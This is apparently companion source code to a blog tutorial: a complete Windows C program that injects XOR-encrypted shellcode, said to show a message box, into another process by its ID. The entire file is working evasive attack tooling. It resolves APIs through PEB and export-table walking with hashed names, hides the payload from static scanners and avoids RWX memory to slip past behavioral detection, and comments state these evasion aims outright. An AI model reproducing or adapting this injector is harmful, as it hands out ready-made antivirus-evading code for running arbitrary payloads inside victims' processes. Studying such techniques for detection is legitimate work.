#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <intrin.h>
#include <wchar.h>

// djb2 hash (case-insensitive)
// We compare hashes at runtime so function name strings never live in the binary.

static uint32_t djb2(const char *s)
{
    uint32_t h = 5381;
    int c;
    while ((c = (unsigned char)*s++) != 0) {
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}

// Pre-computed hashes - generate with hashgen.c if you need more.
// These are the only representation of those API names in this binary.

#define H_OpenProcess           0xBC153E16
#define H_VirtualAllocEx        0xFABD2B14
#define H_WriteProcessMemory    0x686D7128
#define H_CreateRemoteThread    0xD6057BBD
#define H_WaitForSingleObject   0xDA18E23A
#define H_CloseHandle           0x2EAC8647
#define H_VirtualFreeEx         0x8046A46B
#define H_VirtualProtectEx      0xEE45728A

// PEB / LDR structures
// Defined manually so we don't rely on the SDK versions which are often incomplete.

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNI_STR;

typedef struct {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR;

typedef struct {
    BYTE       Reserved1[2];
    BYTE       BeingDebugged;
    BYTE       Reserved2[1];
    PVOID      Reserved3[2];
    MY_PEB_LDR *Ldr;
} MY_PEB;

typedef struct {
    LIST_ENTRY InLoadOrderLinks;            // +0x00
    LIST_ENTRY InMemoryOrderLinks;          // +0x10
    LIST_ENTRY InInitializationOrderLinks;  // +0x20
    PVOID      DllBase;                     // +0x30
    PVOID      EntryPoint;                  // +0x38
    ULONG      SizeOfImage;                 // +0x40
    UNI_STR    FullDllName;                 // +0x48
    UNI_STR    BaseDllName;                 // +0x58
} MY_LDR_ENTRY;

// Wide-char case-insensitive compare, no CRT import needed.
// Same helper used in the blog's PEB walking section.

static int wiequal(const wchar_t *a, USHORT a_bytes, const wchar_t *b)
{
    USHORT len = a_bytes / sizeof(wchar_t);
    for (USHORT i = 0; i < len; i++) {
        wchar_t ca = a[i], cb = b[i];
        if (cb == L'\0') return 0;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return 0;
    }
    return b[len] == L'\0';
}

// ASCII to wide - used when resolving forwarder DLL names like "NTDLL" -> L"NTDLL".

static void a2w(const char *src, wchar_t *dst, size_t max)
{
    size_t i = 0;
    while (src[i] && i < max - 1) { dst[i] = (wchar_t)src[i]; i++; }
    dst[i] = L'\0';
}

// Inline atoi so we don't pull in msvcrt just for argument parsing.

static DWORD str_to_dword(const char *s)
{
    DWORD n = 0;
    while (*s >= '0' && *s <= '9') n = n * 10 + (DWORD)(*s++ - '0');
    return n;
}

// PEB walking - resolves a DLL base address without GetModuleHandleA.
// Reads TEB from gs:[0x30], walks to PEB at +0x60, then traverses
// InMemoryOrderModuleList comparing BaseDllName at each entry.

static PVOID peb_module(const wchar_t *name)
{
    PVOID      teb = (PVOID)__readgsqword(0x30);
    MY_PEB    *peb = *(MY_PEB **)((BYTE *)teb + 0x60);
    MY_PEB_LDR *ldr = peb->Ldr;

    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur  = head->Flink;

    while (cur != head) {
        // Flink lands at InMemoryOrderLinks (+0x10 inside the struct) so we
        // subtract 0x10 to reach the top of LDR_DATA_TABLE_ENTRY.
        MY_LDR_ENTRY *e = (MY_LDR_ENTRY *)((BYTE *)cur - 0x10);
        if (e->BaseDllName.Buffer && e->BaseDllName.Length)
            if (wiequal(e->BaseDllName.Buffer, e->BaseDllName.Length, name))
                return e->DllBase;
        cur = cur->Flink;
    }
    return NULL;
}

// EAT walking - resolves a function VA from a DLL base using a djb2 hash.
// Handles forwarder chains by recursing into the forwarded DLL via another
// PEB walk, exactly as GetProcAddress does internally.

static PVOID eat_resolve(PBYTE mod, uint32_t hash)
{
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(mod + ((PIMAGE_DOS_HEADER)mod)->e_lfanew);
    DWORD expRVA  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD expSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(mod + expRVA);
    PDWORD names = (PDWORD)(mod + exp->AddressOfNames);
    PDWORD funcs = (PDWORD)(mod + exp->AddressOfFunctions);
    PWORD  ords  = (PWORD) (mod + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        LPSTR nm = (LPSTR)(mod + names[i]);
        if (djb2(nm) != hash) continue;

        DWORD rva = funcs[ords[i]];

        // Forwarder check: RVA inside the export directory region means this is
        // a forwarder string like "NTDLL.RtlAllocateHeap", not actual code.
        if (rva >= expRVA && rva < expRVA + expSize) {
            LPSTR fwd = (LPSTR)(mod + rva);
            CHAR  dll[MAX_PATH] = {0};
            CHAR  fn [MAX_PATH] = {0};
            LPSTR dot = strchr(fwd, '.');
            if (!dot) return NULL;
            size_t dlen = (size_t)(dot - fwd);
            memcpy(dll, fwd, dlen);
            strcpy(dll + dlen, ".dll");
            strcpy(fn, dot + 1);

            wchar_t dllW[MAX_PATH] = {0};
            a2w(dll, dllW, MAX_PATH);

            // Recurse because the forwarded DLL might itself forward again.
            PVOID next = peb_module(dllW);
            if (!next) return NULL;
            return eat_resolve((PBYTE)next, djb2(fn));
        }

        return (PVOID)(mod + rva);
    }
    return NULL;
}

#define RESOLVE(base, hash, type) ((type)eat_resolve((PBYTE)(base), (hash)))

typedef HANDLE (WINAPI *FnOpenProcess)         (DWORD, BOOL, DWORD);
typedef LPVOID (WINAPI *FnVirtualAllocEx)      (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *FnWriteProcessMemory)  (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE (WINAPI *FnCreateRemoteThread)  (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *FnWaitForSingleObject) (HANDLE, DWORD);
typedef BOOL   (WINAPI *FnCloseHandle)         (HANDLE);
typedef BOOL   (WINAPI *FnVirtualFreeEx)       (HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *FnVirtualProtectEx)    (HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);

// XOR-encrypted MessageBox shellcode (x64, null-free).
// Original bytes XORed with key 0xAA at build time.

#define XOR_KEY 0xAA

static const unsigned char sc_enc[] =
    // 433 bytes, key 0xAA
    "\xE2\x29\x46\x82\xE2\x29\x4E\x5A\xE2\x27\xBF\xCC\xAA\xAA\xAA"
    "\xE2\x27\xA7\xF8\xAA\xAA\xAA\x42\x34\xAA\xAA\xAA\xE6\x21\x52"
    "\xE2\x27\xA7\xF7\xAA\xAA\xAA\x55\x7A\xE2\x27\xBF\xF5\xAA\xAA"
    "\xAA\xE2\x27\xA7\xE7\xAA\xAA\xAA\x42\xD5\xAA\xAA\xAA\xE7\x99"
    "\x63\xE6\x27\xAF\xCB\xAA\xAA\xAA\xE2\x27\xBF\xE4\xAA\xAA\xAA"
    "\xE2\x99\x63\x55\x7A\xE2\x27\xBF\xFC\xAA\xAA\xAA\xE2\x27\xA7"
    "\xA0\xAA\xAA\xAA\x42\xFC\xAA\xAA\xAA\xE2\x99\x63\x55\x7A\xE1"
    "\xEF\xF8\xE4\xEF\xE6\x99\x98\x84\xEE\xE6\xE6\xAA\xE6\xC5\xCB"
    "\xCE\xE6\xC3\xC8\xD8\xCB\xD8\xD3\xEB\xAA\xFF\xF9\xEF\xF8\x99"
    "\x98\x84\xEE\xE6\xE6\xAA\xE7\xCF\xD9\xD9\xCB\xCD\xCF\xE8\xC5"
    "\xD2\xEB\xAA\xE2\xCF\xC6\xC6\xC5\x8A\xDD\xC5\xD8\xC6\xCE\xAA"
    "\xE7\xCF\xD9\xD9\xCB\xCD\xCF\xAA\xEF\xD2\xC3\xDE\xFA\xD8\xC5"
    "\xC9\xCF\xD9\xD9\xAA\xE2\x29\x46\x82\xCF\xE6\x21\xAE\x8F\xCA"
    "\xAA\xAA\xAA\xE7\x21\xEA\xB2\xE7\x27\xCA\xBA\xE7\x21\xAE\x8E"
    "\x56\xE3\x21\xD2\xCA\xE2\x21\x5B\x06\x2E\x6A\xDE\x8C\x20\x8D"
    "\x2A\x56\xCB\xD6\xA9\x2A\x46\x8A\x90\x4A\xDF\xA2\xE2\x55\x6D"
    "\xE2\x55\x6D\x41\x4F\xE7\x21\xAA\xE7\x91\x6E\xDF\x7C\xE2\x99"
    "\x6A\x43\x0D\xAA\xAA\xAA\xE3\x21\xF2\x9A\xEE\x21\xE1\x96\xE6"
    "\xA9\x61\xE3\x2B\x6B\x22\xAA\xAA\xAA\xEF\x21\x83\xE7\x2F\x47"
    "\xDF\xA2\xE2\x99\x6A\x43\x2F\xAA\xAA\xAA\xE4\x27\xAE\x81\xEF"
    "\x21\xDB\xAE\xE7\xA9\x5F\xEB\x21\xE2\xB2\xEF\x21\xFA\x8A\xE6"
    "\xA9\x79\x55\x63\xE7\x27\xA6\x20\xEB\x21\x93\xE2\xA9\x51\xE2"
    "\x21\x58\x0C\xDF\xA2\x20\xAC\x2E\x6A\xDE\xA3\x41\x5F\x48\x4C"
    "\xE2\x99\x6A\x41\xE4\xEF\x21\xE2\x8E\xE6\xA9\x61\xCC\xEB\x21"
    "\xA6\xE3\xEF\x21\xE2\xB6\xE6\xA9\x61\xEB\x21\xAE\x23\xE3\x91"
    "\x6F\xD6\x85\xE3\x91\x6C\xD9\x80\xE2\x27\x9E\xB2\xE2\x27\xD6"
    "\x8E\x9A\xE6\x21\x4D\x0E\x2A\x94\x84\xDF\x50\x0E\x6D\xAD\xEE"
    "\xE6\xE6\xAA\xE3\x21\x66\xEB\x55\x7D\xE3\x21\x66\xE2\x21\x7C"
    "\x43\xBE\x55\x55\x55\xE2\xA9\x69\xE2\x29\x6E\x82\x69";

// xor_decrypt - XOR is its own inverse so the same loop both encrypts and
// decrypts. dst must be at least len bytes.

static void xor_decrypt(const unsigned char *src, unsigned char *dst, SIZE_T len)
{
    for (SIZE_T i = 0; i < len; i++)
        dst[i] = src[i] ^ XOR_KEY;
}

// main

int main(int argc, char *argv[])
{
    if (argc != 2) return 1;

    DWORD  pid    = str_to_dword(argv[1]);
    SIZE_T sc_len = sizeof(sc_enc) - 1;   // strip C-string null terminator

    // Resolve kernel32 base via PEB walk, no GetModuleHandleA in IAT.
    PVOID k32 = peb_module(L"kernel32.dll");
    if (!k32) return 1;

    // Resolve all needed APIs via EAT walk + djb2, no suspicious entries in IAT.
    FnOpenProcess         pOpenProcess         = RESOLVE(k32, H_OpenProcess,         FnOpenProcess);
    FnVirtualAllocEx      pVirtualAllocEx      = RESOLVE(k32, H_VirtualAllocEx,      FnVirtualAllocEx);
    FnWriteProcessMemory  pWriteProcessMemory  = RESOLVE(k32, H_WriteProcessMemory,  FnWriteProcessMemory);
    FnCreateRemoteThread  pCreateRemoteThread  = RESOLVE(k32, H_CreateRemoteThread,  FnCreateRemoteThread);
    FnWaitForSingleObject pWaitForSingleObject = RESOLVE(k32, H_WaitForSingleObject, FnWaitForSingleObject);
    FnCloseHandle         pCloseHandle         = RESOLVE(k32, H_CloseHandle,         FnCloseHandle);
    FnVirtualFreeEx       pVirtualFreeEx       = RESOLVE(k32, H_VirtualFreeEx,       FnVirtualFreeEx);
    FnVirtualProtectEx    pVirtualProtectEx    = RESOLVE(k32, H_VirtualProtectEx,    FnVirtualProtectEx);

    if (!pOpenProcess || !pVirtualAllocEx || !pWriteProcessMemory ||
        !pCreateRemoteThread || !pWaitForSingleObject || !pCloseHandle ||
        !pVirtualProtectEx)
        return 1;

    // Decrypt shellcode into a local heap buffer.
    // The encrypted blob in .rdata is meaningless to a static scanner;
    // plaintext only exists in this buffer at runtime.
    unsigned char *sc_plain = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, sc_len);
    if (!sc_plain) return 1;
    xor_decrypt(sc_enc, sc_plain, sc_len);

    // Open the target process.
    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { HeapFree(GetProcessHeap(), 0, sc_plain); return 1; }

    // Allocate RW memory in the target process - never RWX.
    // RWX in a remote process is one of the strongest behavioral heuristics.
    // We write as RW then flip to RX after the write is done.
    LPVOID remote = pVirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        HeapFree(GetProcessHeap(), 0, sc_plain);
        pCloseHandle(hProc);
        return 1;
    }

    // Write the decrypted shellcode into the target.
    SIZE_T written = 0;
    if (!pWriteProcessMemory(hProc, remote, sc_plain, sc_len, &written) || written != sc_len) {
        HeapFree(GetProcessHeap(), 0, sc_plain);
        pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        pCloseHandle(hProc);
        return 1;
    }

    // Wipe and free our local plaintext copy now that it is in the target.
    SecureZeroMemory(sc_plain, sc_len);
    HeapFree(GetProcessHeap(), 0, sc_plain);

    // Flip the remote region from RW to RX before executing.
    // At no point does an RWX region exist in the target.
    DWORD old_prot = 0;
    if (!pVirtualProtectEx(hProc, remote, sc_len, PAGE_EXECUTE_READ, &old_prot)) {
        pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        pCloseHandle(hProc);
        return 1;
    }

    // Kick off a remote thread at the shellcode entry point.
    HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (!hThread) {
        pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        pCloseHandle(hProc);
        return 1;
    }

    pWaitForSingleObject(hThread, 5000);

    pVirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
    pCloseHandle(hThread);
    pCloseHandle(hProc);
    return 0;
}
